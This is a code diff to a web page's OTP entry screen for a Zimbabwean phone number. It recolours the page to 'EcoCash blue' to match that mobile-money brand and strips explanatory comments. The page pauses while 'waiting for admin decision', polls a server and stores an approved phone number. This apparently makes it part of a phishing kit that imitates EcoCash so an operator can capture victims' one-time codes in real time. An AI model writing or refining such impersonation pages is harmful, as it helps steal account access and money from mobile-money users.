@@ -144,7 +144,7 @@
       text-align: center;
     }
 
-    /* Spinner overlay */
+    /* Spinner overlay – now blue to match EcoCash branding */
     #spinnerOverlay {
       position: fixed;
       inset: 0;
@@ -159,7 +159,7 @@
       width: 48px;
       height: 48px;
       border: 5px solid #ffffff;
-      border-top: 5px solid #e12b2b;
+      border-top: 5px solid #1c6aa6;  /* changed from red to EcoCash blue */
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
@@ -238,7 +238,7 @@
     const submitBtn = document.getElementById('submitBtn');
     const errorDiv = document.getElementById('errorMsg');
     const maskedSpan = document.getElementById('maskedPhoneDisplay');
-    const resendTimerSpan = document.getElementById('resendTimer');   // your existing span
+    const resendTimerSpan = document.getElementById('resendTimer');
     
     const spinner = document.getElementById('spinnerOverlay');
     function showSpinner() { spinner.style.display = 'flex'; }
@@ -246,11 +246,11 @@
     
     // ==================== STATE ====================
     let isSubmitting = false;
-    let countdownSeconds = 120;          // 2 minutes = 120 seconds
+    let countdownSeconds = 120;
     let countdownInterval = null;
     let pollingInterval = null;
     
-    let userPhone = null;                // raw local number starting with 7 (9 digits)
+    let userPhone = null;
     let maskedPhone = '+263 7******';
     
     // ==================== RETRIEVE PHONE FROM SESSION ====================
@@ -277,7 +277,7 @@
       maskedSpan.innerText = maskedPhone;
     }
     
-    // ==================== COUNTDOWN (seconds only, redirect at 0) ====================
+    // ==================== COUNTDOWN ====================
     function updateResendDisplay() {
       if (resendTimerSpan) resendTimerSpan.innerText = countdownSeconds;
     }
@@ -294,9 +294,8 @@
       countdownSeconds = 120;
       updateResendDisplay();
       countdownInterval = setInterval(() => {
-        if (isSubmitting) return; // pause while waiting for admin decision
+        if (isSubmitting) return;
         if (countdownSeconds <= 1) {
-          // Time's up → redirect to login.html (no resend option)
           stopCountdown();
           stopPolling();
           sessionStorage.removeItem('ecocash_approved_phone');
@@ -543,7 +542,7 @@
       }
       
       setupOtpEvents();
-      startCountdown();      // countdown from 120 seconds → redirect to login.html at 0
+      startCountdown();
       
       submitBtn.addEventListener('click', (e) => {
         e.preventDefault();
